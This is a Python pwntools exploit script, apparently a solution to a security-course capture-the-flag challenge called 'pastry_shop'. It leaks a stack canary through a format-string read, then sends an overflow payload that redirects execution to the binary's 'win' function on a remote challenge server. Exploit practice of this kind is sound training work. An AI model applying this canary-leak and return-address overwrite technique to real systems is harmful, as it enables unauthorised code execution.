from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13560

elf = ELF('/home/kali/Desktop/offsec/labs/lab2/challenges/00_pastry_shop/pastry_shop')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r


    
canary_offset = 72  #with gdb
rip_offset = 88

win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")


rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

CANARY_IDX = 23 #with format string 

r = conn()

r.recvuntil(b"dear customer?\n")
r.sendline(f"%{CANARY_IDX}$lx".encode())
leak = r.recvline().strip()
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")
r.recvuntil(b"to order?\n")
payload = flat(
    b"A" * canary_offset,
    p64(canary),
    b"B" * (rip_offset - canary_offset - 8),
    p64(elf.sym.win),
)
r.send(payload)
r.interactive()